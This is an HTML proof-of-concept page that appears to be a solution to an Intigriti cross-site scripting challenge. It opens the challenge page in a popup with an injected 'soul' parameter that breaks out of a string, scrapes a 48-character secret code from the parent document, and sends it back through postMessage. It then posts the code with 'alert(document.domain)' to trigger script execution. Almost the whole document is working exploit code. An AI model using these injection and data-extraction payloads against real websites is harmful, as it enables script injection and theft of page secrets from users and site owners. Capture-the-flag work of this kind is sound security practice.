<!DOCTYPE html>
<html><head><title>Click Me</title></head><body>
<button onclick="go()">Click Here</button>
<pre id="log"></pre>
<script>
const log=m=>document.getElementById('log').textContent+=m+'\n';
let popup;

window.addEventListener('message',e=>{
    if(!e.data)return;
    log(JSON.stringify(e.data));
    
    // Got the full code directly!
    if(e.data.code && e.data.code.length===48){
        log('CODE EXTRACTED: '+e.data.code);
        if(popup&&!popup.closed){
            popup.postMessage(e.data.code+'alert(document.domain)','*');
            log('>>> XSS TRIGGERED <<<');
        }
    }
    
    if(e.data.error){
        log('ERROR: '+e.data.error);
    }
});

function go(){
    // SOUL: Extract the code directly from parent HTML like your Python script!
    const soul='";'+
        'setTimeout(()=>{'+
            'try{'+
                'const html=parent.document.documentElement.innerHTML;'+
                'const match=/encodeURIComponent\\([\'\\"]([0-9a-fA-F]{48})[\'\\"]\\)/.exec(html);'+
                'if(match){'+
                    'const code=match[1];'+
                    'opener.postMessage({code:code},"*")'+
                '}'+
            '}catch(e){'+
                'opener.postMessage({error:e.toString()},"*")'+
            '}'+
        '},1000);//';
    
    const url='https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced?soul='+encodeURIComponent(soul);
    
    log('Opening popup...');
    popup=window.open(url,'xss','width=1200,height=800');
    
    if(!popup){
        log('ERROR: Popup blocked!');
    }
}
</script>
</body></html>

